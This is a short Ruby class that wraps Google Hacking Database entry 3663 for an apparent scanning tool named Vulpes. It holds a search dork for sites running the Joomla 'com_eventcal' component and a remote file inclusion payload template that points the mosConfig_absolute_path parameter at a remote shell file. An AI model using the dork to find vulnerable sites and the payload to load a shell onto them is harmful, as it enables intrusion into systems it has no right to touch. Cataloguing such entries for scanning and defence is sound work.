module Dorks
   class Dork3663 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3663",
            ghdb_url: "https://www.exploit-db.com/ghdb/3663",
            severity: "5",
            category: "advisories_and_vulnerabilities.rfi",
            publish_date: "2011-01-02",
            author: "anonymous",
            dork: <<~EDORK,
inurl:"com_eventcal"
EDORK
            description: <<~EDESC
Author : AtT4CKxT3rR0r1ST [F.Hack@w.cn] RFI: www.site.com/components/com_eventcal/eventcal.php?mosConfig_absolute_path=[shell.txt?]
EDESC
         })

      end
   end
end
